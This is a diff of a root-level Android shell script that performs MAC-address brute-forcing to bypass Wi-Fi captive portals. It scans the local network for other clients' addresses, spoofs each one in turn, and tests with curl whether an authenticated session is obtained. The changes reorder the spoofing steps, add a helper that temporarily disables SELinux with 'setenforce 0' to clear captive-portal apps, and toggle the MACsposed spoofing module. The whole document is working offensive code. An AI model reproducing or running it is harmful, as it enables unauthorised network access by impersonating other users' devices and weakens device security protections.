@@ -472,7 +472,7 @@
 										{
 											local err
 											_source_plugin "${home_dir}/plugins/302-parser.sh" || return 1
-											_302parser_parse_auto "http://google.com" "${home_dir}/logs/tmp" &>>"${log_file}"; err=${?}
+											_302parser_parse_auto "http://google.com" "${home_dir}/logs/tmp" "${AUTO_SCAN_TIMEOUT}" &>>"${log_file}"; err=${?}
 											[ ${err} -eq 2 ] && { gid=0; port=0; host=0; domain=0; return 0; }
 											([ ${err} -eq 4 ] || [ ${err} -eq 0 ]) && return 0 || return ${err}
 										}
@@ -520,7 +520,7 @@
 												_echo "\tScan completed found: ${i[1]} devices" 1
 												_echo "\t\t_parse_arpscan --> scan completed: total(${i[0]}) filtered(${i[1]})" 0
 												clients="${list}"
-												_count_and_notify "${i[1]}"
+												_count_and_notify "${i[1]}"; return ${?}
 										}
 							_parse_iproute()
 										{
@@ -680,7 +680,17 @@
 																		mode="$1"; u=0
 																		u="'$(su -c ''${prefix}'/cmd wifi status 2>&1 | tr -d "\n"')'"
 
-																	if [ "${mode}" = "get_wifi_info" ]; then
+																	if [ "${mode}" = "is_disabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
+																		_echo "- Exiting... Wi-Fi is disabled by user" 1
+																		exit 1 # return 1
+																	elif [ "${mode}" = "is_enabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
+																		_echo "- Enabling Wi-Fi" 1
+																			# svc = Legacy Android
+																			# cmd = Modern Android
+																		su -c ''${prefix}'/cmd wifi set-wifi-enabled enabled >/dev/null 2>&1' || su -c 'svc wifi enable'
+																		sleep 1.0
+																		return 0
+																	elif [ "${mode}" = "get_wifi_info" ]; then
 																			ssid=$(echo "${u}" | grep -Po "SSID: \K[^,]*" | sed -n 1p)
 																		if [ -z "${ssid}" ]; then
 																			return 1
@@ -718,16 +728,6 @@
 																		else
 																			return 0
 																		fi
-																	elif [ "${mode}" = "is_disabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
-																		_echo "- Exiting... Wi-Fi is disabled by user" 1
-																		exit 1 # return 1
-																	elif [ "${mode}" = "is_enabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
-																		_echo "- Enabling Wi-Fi" 1
-																			# svc = Legacy Android
-																			# cmd = Modern Android
-																		su -c ''${prefix}'/cmd wifi set-wifi-enabled enabled >/dev/null 2>&1' || su -c 'svc wifi enable'
-																		sleep 1.0
-																		return 0
 																	fi
 																}
 											_wificonnect_getinfo()
@@ -1058,14 +1058,14 @@
 																}
 											_wificonnect_bruteforce()
 																{
-																	local c x y t n r cooldown curr_addr
+																	local c x y t n r cooldown curr_addr macsposed_state
 																			mode="auto"
 																			_wificonnect_select || return 1
 																		if [ -z "${ws_disconnect_alt}" ] || [ -z "${ws_macchanger_alt}" ]; then
 																			sudo "${home_dir}/plugins/wsconfig.sh"
 																		fi
-																			_macchanger_set "--random" || return 1
 																			_wificonnect_status "is_disconnected" || return 1
+																			_wificonnect_clear; _macchanger_set "--random" || return 1
 																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
 																			{ _process_networkinfo || return 1; _json_initconfig || return 1; _json_networkinfo; _json_networkgid; }
 																		if [ "${gid}" = "0" ]; then
@@ -1080,7 +1080,7 @@
 																	for x in ${reqs_list}; do
 																			_echo "\t${color_tip}Proccessing: ${t}/${max_reqs}${color_reset}" 1
 																			t=$((t+1)); r="${color_error}"
-																			{ _macchanger_set "${x}" || return 1; _wificonnect_status "is_disconnected" || return 1; }
+																			{ _wificonnect_status "is_disabled" || return 1; _wificonnect_status "is_disconnected" || return 1; _macchanger_set "${x}" || return 1; }
 																		if ! _wificonnect_connect "${ssid}" "${sec}" "${bssid}"; then
 																			cooldown=$((cooldown+1))
 																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](client: ${request_addr})" 0
@@ -1094,11 +1094,13 @@
 																			play-audio "$home_dir/sfx/notification_error.m4a" &
 																			break
 																		elif [ "${x}" != "${curr_addr}" ]; then
+																			sudo pm enable "com.berdik.macsposed"
 																			_echo "\t${color_error}Error request mismatch: ${curr_addr}${color_reset}\n\t${color_tip}Tip: Battery saver killed MACsposed !${color_reset}" 1
 																			_echo "\t\t_wificonnect_bruteforce --> error requested and current address does not match: [current_addr](${curr_addr}) [request_addr](${x})" 0
 																			play-audio "$home_dir/sfx/notification_error.m4a" &
 																			break
 																		else
+																			[ -z "${macsposed_state}" ] && { macsposed_state="1"; sudo pm disable "com.berdik.macsposed"; }
 																			cooldown=0
 																			curl -vsLA "${useragent}" "${host}:${port}/${status}" >"${home_dir}/logs/tmp" 2>"${home_dir}/logs/err"
 																			c=$(cat "${home_dir}/logs/err" | tr '\t\r\n*' '#')
@@ -1177,22 +1179,23 @@
 																		local result x
 																		_echo "- Performing eligibility test..." 1
 																		_wificonnect_select || return 1
-																			_echo "- Starting comptiablity checker ..." 1
-																			sudo "${home_dir}/plugins/wsconfig.sh"
+																			_echo "- Starting comptiablity checker..." 1
+																				sudo "${home_dir}/plugins/wsconfig.sh"
+																				_wificonnect_status "is_disconnected" || return 1
 																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || \
 																									{ 
 																										play-audio "$home_dir/sfx/notification_error.m4a" &
 																										return 1
 																									}
-																				_macchanger_set "--random"; result="${ret}" || return 1
-																					_wificonnect_status "is_disconnected" || return 1
+																				_wificonnect_status "is_disconnected" || return 1
+																					_macchanger_set "--random"; result="${ret}" || return 1
 																						_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || \
 																									{ 
 																										play-audio "$home_dir/sfx/notification_error.m4a" &
 																										return 1
 																									}
 																		x=$(su -c ''${prefix}'/iw dev '${iface}' info 2>&1 | '${prefix}'/grep -Po "addr \K.*"')
-																	if [ "${x}" = "${ret}" ]; then
+																	if [ "${x}" = "${result}" ]; then
 																		_echo "\t${color_success}Eligibility test passed !${color_reset}" 1
 																		return 0
 																	else
@@ -1201,29 +1204,17 @@
 																		return 1
 																	fi
 																}
+											_wificonnect_clear()
+																{
+																	su -c 'setenforce 0; local list x; list="com.google.android.captiveportallogin com.android.captiveportallogin com.google.android.captiveportallogin2"; for x in ${list}; do '${prefix}'/pm clear "${x}" >/dev/null 2>&1 || echo "failed clearing: ${x}"; done; setenforce 1'
+																}
 											_wificonnect_reset()
 																{
-																			local i x err log tmp arr list; i=0
-																			tmp="${home_dir}/logs/tmp"; err="${home_dir}/logs/err"
-																			_echo "\t${color_tip}Getting list of saved networks...${color_reset}" 1
-																			su -c ''${prefix}'/cmd wifi list-networks >'${tmp}' 2>&1'
-																	while read x; do
-																			arr=(${x})
-																		if [[ "${arr[0]}" =~ (^[0-9]+$) ]] && [[ "${arr[@]}" =~ (open|owe) ]]; then
-																			i=$((i+1)); list+=" ${arr[0]}"
-																		fi
-																	done< <(cat "${tmp}")
-																			_echo "\t${color_tip}Removing ${i} saved networks...${color_reset}" 1
-																			[ ${i} -ge 1 ] && su -c 'for x in '${list}'; do '${prefix}'/cmd wifi forget-network ${x} >>/dev/null 2>'${err}'; done'
-																		if [ -s "${err}" ]; then
-																			err=$(cat "${err}" | tr "\n" "#")
-																			log="${home_dir}/logs/wifi_reset_${bot_date}.log"
-																			cat "${tmp}" >"${log}"
-																			_echo "\t_wificonnect_reset --> unexpected error: [error](${err}) [result](${log})" 0
-																		fi
-																			_echo "\t${color_tip}Clearing Captive-Portal apps...${color_reset}" 1
-																			su -c 'local list x; list="com.google.android.captiveportallogin com.android.captiveportallogin com.google.android.captiveportallogin2"; for x in ${list}; do '${prefix}'/pm clear "${x}" >/dev/null 2>&1 || echo "failed clearing: ${x}"; done; /data/adb/post-fs-data.d/hostname-spoofer.sh'
-																			_echo "\t${color_success}Completed !${color_reset}" 1
+																	_echo "\t${color_tip}Resetting network settings...${color_reset}" 1
+																	su -c 'local x list; list=$(cmd wifi list-networks | grep -F "open" | awk '\''{print $1}'\'' | tr "\n" " "); for x in ${list}; do echo "removing network: ${x}"; cmd wifi forget-network "${x}"; done'
+
+																	_wificonnect_clear
+																	return 0
 																}
 											_wificonnect_getpsk()
 																{
@@ -1263,12 +1254,13 @@
 																		{ _wificonnect_getpsk; _json_initconfig || return 1; _json_networkpskauto; }
 																		[ "${1}" = "pin" ] && echo -n>"${home_dir}/logs/bssidx.log"
 																		mode="auto"; stat=(0 0 0)
+																		_wificonnect_status "is_disconnected" || return 1
+																		_macchanger_set "--random" || return 1
+																		AUTO_SCAN_TIMEOUT="3"
 																	while true; do
 																			_echo "- Running ${1} network discovery: $(date +%r)" 1
-																			_wificonnect_getinfo || continue
 																			_wificonnect_status "is_disabled" || return 1
-																			_macchanger_set "--random" || return 1
-																			{ _json_initconfig || return 1; _json_networkinfoauto; }
+																			{ _wificonnect_getinfo || continue; _json_initconfig || return 1; _json_networkinfoauto; }
 																				[ "${1}" = "pin" ] && echo "${bssid_list[@]}" >>"${home_dir}/logs/bssidx.log"
 																				i=0; total="${#bssid_list[@]}"; t=1
 																		while true; do
@@ -1299,10 +1291,12 @@
 												_source_plugin "${home_dir}/plugins/connection-status.sh" || return 1
 											if  [ "$1" = "quick_setaddr" ]; then
 												_wificonnect_status "get_wifi_info"; err=${?}
-												_macchanger_set "${2}" || return 1
 												if [ ${err} -eq 0 ]; then
 													_wificonnect_status "is_disconnected"
+													_macchanger_set "${2}" || return 1
 													_wificonnect_connect "${ssid}" "${sec}" || return 1
+												else
+													_macchanger_set "${2}" || return 1
 												fi
 												return ${err}
 											fi
@@ -1385,7 +1379,7 @@
 												echo -e "\t${x} ${ipv62mac}"
 											done< <(${arg} ping6 "ff02::01%${iface}" | stdbuf -oL awk '{print $4}')
 											_echo "\tScan completed found: ${i} devices" 1
-											_count_and_notify "${i}"
+											_count_and_notify "${i}"; return ${?}
 										}
 						_process_tcpdump()
 										{
